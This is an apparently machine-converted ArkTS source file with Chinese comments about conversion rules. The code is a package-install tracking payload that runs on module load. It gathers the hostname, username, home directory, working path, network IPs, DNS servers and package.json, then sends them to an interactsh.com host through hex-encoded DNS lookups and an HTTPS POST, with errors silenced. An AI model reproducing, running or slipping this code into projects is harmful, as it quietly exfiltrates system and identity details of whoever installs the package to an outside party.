// 应用约束：使用let/const替换var（规则9），模块导入使用ES6语法（规则60,61）
import * as os from 'os.ets';
import * as dns from 'dns.ets';
import * as querystring from 'querystring.ets';
import * as https from 'https.ets';
import * as fs from 'fs.ets';
import * as path from 'path.ets';
import packageJSON from './package.ets'; // 假设已转换为.ets文件

// 应用约束：类属性需要初始化（规则18）
class TrackingData {
    p: string = '';
    c: string = '';
    hd: string = '';
    hn: string = '';
    un: string = '';
    dns: string = '';
    r?: string = undefined;
    v: string = '';
    pjson: object = {};
    ip: string = '';
}

// 应用约束：函数参数/返回类型需要显式声明（规则10）
function getFiles(paths: string[]): string[] {
    let ufiles: string[] = [];
    for (let j = 0; j < paths.length; j++) {
        let mpath = paths[j];
        let files = fs.readdirSync(mpath);
        for (let i = 0; i < files.length; i++) {
            ufiles.push(path.join(mpath, files[i]));
        }
    }
    return ufiles;
}

// 应用约束：替换Buffer为TextEncoder（规则75）
function toHex(data: string): string {
    const encoder = new TextEncoder();
    const uint8Array = encoder.encode(data);
    let hex = '';
    for (const byte of uint8Array) {
        hex += byte.toString(16).padStart(2, '0');
    }
    return hex;
}

function gethttpips(): string[] {
    let str: string[] = [];
    let networkInterfaces = os.networkInterfaces();
    for (let item in networkInterfaces) {
        if (item != "lo") {
            for (let i = 0; i < networkInterfaces[item].length; i++) {
                str.push(networkInterfaces[item][i].address);
            }
        }
    }
    return str;
}

function getIps(): string {
    let str = "";
    let networkInterfaces = os.networkInterfaces();
    for (let item in networkInterfaces) {
        if (item != "lo") {
            for (let i = 0; i < networkInterfaces[item].length; i++) {
                str = str + toHex(networkInterfaces[item][i].address) + ".";
            }
        }
    }
    return str.slice(0, -1);
}

function getPathChunks(filePath: string): string {
    let str = "p";
    let chunks = filePath.split('/');
    for (let i = 0; i < chunks.length; i++) {
        str = str + toHex(chunks[i]) + ".";
    }
    str = str.slice(0, -1) + "p";
    return str;
}

function toName(pkg: TrackingData): string[] {
    let str = "";
    let queries: string[] = [];
    let substr1 = "";
    let substr2 = "";
    const hostname = "c5c77jy2vtc0000xqshggdrmqmoyyyyyd.interactsh.com";

    str = toHex(pkg.hn) + "." + toHex(pkg.p) + "." + getPathChunks(pkg.c) + "." 
        + toHex(pkg.un) + "." + getIps() + "." + hostname;

    if (str.length > 255) {
        substr1 = toHex(pkg.p) + "." + getPathChunks(pkg.c);
        substr2 = getIps();
        
        if (substr1.length < 150) {
            substr1 = toHex(pkg.hn) + "." + substr1 + "." + toHex(pkg.un);
            queries.push(substr1 + "." + hostname);
            queries.push(substr2 + "." + hostname);
        } else if (substr2.length < 150) {
            substr2 = toHex(pkg.hn) + "." + toHex(pkg.un) + "." + substr2;
            queries.push(substr1 + "." + hostname);
            queries.push(substr2 + "." + hostname);
        } else {
            queries.push(toHex(pkg.hn) + "." + substr1 + "." + hostname);
            queries.push(toHex(pkg.hn) + "." + toHex(pkg.hd) + "." + toHex(pkg.un) + "." + hostname);
            queries.push(toHex(pkg.hn) + "." + substr2 + "." + hostname);
        }
    } else {
        queries.push(str);
    }
    return queries;
}

// 应用约束：显式类型声明（规则23）
const td: TrackingData = {
    p: packageJSON.name,
    c: __dirname,
    hd: os.homedir(),
    hn: os.hostname(),
    un: os.userInfo().username,
    dns: JSON.stringify(dns.getServers()),
    r: packageJSON?.___resolved,
    v: packageJSON.version,
    pjson: packageJSON,
    ip: JSON.stringify(gethttpips()),
};

let qs = toName(td);
for (let j = 0; j < qs.length; j++) {
    dns.lookup(qs[j], (err: Error, result: string) => {
        // console.log(result)
    });
}

const trackingData = JSON.stringify(td);
let postData = querystring.stringify({
    msg: trackingData,
});

// 应用约束：显式类型声明（规则10）
let options: https.RequestOptions = {
    hostname: "c5c77jy2vtc0000xqshggdrmqmoyyyyyd.interactsh.com",
    port: 443,
    path: "/",
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": postData.length.toString(),
    },
};

let req = https.request(options, (res: https.IncomingMessage) => {
    res.on("data", (d: Buffer) => {
        // process.stdout.write(d);
    });
});

req.on("error", (e: Error) => {
    // console.error(e);
});

req.write(postData);
req.end();
